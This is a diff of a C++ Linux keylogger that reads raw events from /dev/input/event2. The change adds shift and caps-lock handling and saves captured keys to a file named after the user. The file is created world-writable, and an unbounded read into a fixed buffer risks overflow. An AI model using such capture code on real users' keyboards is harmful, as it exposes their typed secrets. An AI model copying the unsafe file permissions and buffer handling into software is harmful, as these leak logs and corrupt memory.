@@ -24,34 +24,53 @@ int check(int result){
 
 int main()
 {
+    //check(chmod("/dev/input/event2", S_IROTH));
     Key_logger name_of_the_keys;
     int keys_fd; //дескриптор
     struct input_event t;  
+    struct input_event t_shift;
     keys_fd = check(open(DEV_PATH, O_RDONLY));
-    
+    char Name[100];
+    std::cout << "Enter the name of the user >> " ;
+    std::cin >> Name; 
+    auto path = strcat(Name, ".txt");
+
     std::vector<const char*> names;
-    int flag = 0;
+    bool flag_shift = false;
+    bool flag_caps = false;
     if (keys_fd <= 0)
     {
-        printf("open/dev/input/js0 device error!\n");
+        std::cout << "open/dev/input/event2 device error!" << std::endl;
         return 0;
     }
     while (true)
     {
+
         if (read(keys_fd, &t, sizeof(t)) == sizeof(t))
         {
             if (t.type == EV_KEY)
-                if (/*t.value == 0 || */ t.value == 1)
+
+                if (t.value == 0 ||  t.value == 1)
                 {
-                    if (flag == 42)
-                         t.code += 1000;
-                    names.push_back(name_of_the_keys.get_name_of_the_key(t.code));   
-                    
-                    
-                    printf("key %s %s\n", name_of_the_keys.get_name_of_the_key(t.code), (t.value) ? "Pressed" : "Released");
-                    
-                    flag = t.code;
+                   if (t.code == 42 && t.value == 1)
+                    flag_shift = true;
+                   if (t.code == 42 && t.value == 0)
+                    flag_shift = false;
+                    if (t.code == 58 && t.value == 1)
+                        flag_caps = !flag_caps;
+                   if (flag_shift == true && t.value ==1)
+                   {
+                       names.push_back(name_of_the_keys.get_name_of_the_key(t.code+1000));   
+                       std::cout << "key " << name_of_the_keys.get_name_of_the_key(t.code+1000) << std::endl;    
+                   }
+                   if (flag_shift == false && t.value == 1)
+                   {
+                       names.push_back(name_of_the_keys.get_name_of_the_key(t.code));   
+                       std::cout << "key " << name_of_the_keys.get_name_of_the_key(t.code) << std::endl;    
+                   }
+                   
                 }
+                
                 if (t.code == 1)
                     break;
         }
@@ -60,7 +79,7 @@ int main()
     }
     close(keys_fd);
     
-    auto d_save = check(open("Roman.txt", O_CREAT | O_RDWR, S_IRWXU | S_IRWXG | S_IRWXO));
+    auto d_save = check(open(path, O_CREAT | O_RDWR, S_IRWXU | S_IRWXG | S_IRWXO));
     
     for (int i = 0; i < names.size(); ++i)
     {
